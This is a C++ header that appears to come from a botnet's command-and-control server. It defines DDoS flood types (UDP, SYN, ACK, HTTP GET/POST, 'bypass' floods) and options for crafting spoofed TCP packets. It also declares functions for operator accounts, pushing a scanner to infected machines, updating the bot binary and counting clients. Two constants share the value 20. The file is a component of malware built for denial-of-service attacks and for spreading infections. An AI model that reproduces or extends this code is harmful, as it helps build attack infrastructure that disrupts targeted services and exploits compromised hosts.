#pragma once

#include <fcntl.h>
#include <string>

#include "main.h"

enum
{
    FLOOD_UDP = 1,
    FLOOD_ACK = 2,
    FLOOD_SYN = 3,
    FLOOD_GET = 4,
    FLOOD_POST = 5,
    FLOOD_JUNK = 6,
	FLOOD_ACK_CONNECT = 7,
    OPT_PORT = 1,
    OPT_SIZE = 2,
    //OPT_THREAD_COUNT = 3,
    OPT_HTTP_PATH = 4,
    OPT_HTTP_CONNECTION = 5,
    OPT_DOMAIN = 6,
    OPT_TCP_TTL = 7,
	OPT_TCP_SOURCE_PORT = 8,
	OPT_TCP_ACK = 9,
	OPT_TCP_FIN = 10,
	OPT_TCP_URG = 11,
	OPT_TCP_PSH = 12,
	OPT_TCP_RST = 13,
	OPT_TCP_SYN = 14,
	OPT_TCP_TOS = 15,
	OPT_TCP_ID = 16,
	OPT_TCP_SEQUENCE = 17,
	OPT_TCP_SOURCE_IP = 18,
	OPT_TCP_ACK_SEQUENCE = 19,
	OPT_HANDSHAKE = 20,
	FLOOD_UDPBYPASS = 20,
	FLOOD_SYNBYPASS = 21
};

static int enable = 1;

#define NONBLOCK(fd) (fcntl(fd, F_SETFL, O_NONBLOCK | fcntl(fd, F_GETFL, 0)))
#define REUSE_ADDR(fd) (setsockopt(fd, SOL_SOCKET, SO_REUSEADDR, &enable, sizeof(enable)))
#define PACKED __attribute__((packed))

int mysql_login(struct admin *);
void mysql_set_restrictions(struct admin *);
void mysql_update_login(struct admin *, int);
void mysql_update_disable(struct admin *, const char *, int);
void mysql_add_user(const char*, const char*, const int, const int, const int, const int, const int, const int);
void mysql_remove_user(const char*);

void mysql_get_client_information(struct admin *);
void mysql_clear_login(void);
void mysql_log(std::string, int, std::string, std::string, uint16_t);
int mysql_allow_concurrent(int, std::string, uint16_t, int, int);

struct command *command_process(struct process *);
struct command *process_update(struct process *, uint8_t);

void push_scanner(struct process *, struct command *);
void update_binary(struct process *);

std::map<std::string, int> statistics(void);

int client_count(int);